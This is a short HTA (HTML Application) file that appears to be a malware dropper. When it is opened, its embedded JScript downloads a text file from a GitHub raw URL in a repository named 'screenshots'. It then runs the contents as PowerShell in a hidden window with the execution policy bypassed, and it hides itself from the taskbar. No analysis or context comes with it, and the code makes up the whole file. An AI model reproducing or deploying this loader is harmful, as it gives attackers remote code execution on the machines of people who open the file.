<html><head><title>a</title><hta:application showintaskbar="no" singleinstance="no"/></head><script language=JScript>var sh=new ActiveXObject("WScript.Shell");var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);x.send();sh.Run("powershell -NoP -Ex Bypass -c \"" + x.responseText.replace(/\n/g,";") + "\"",0);</script></body></html>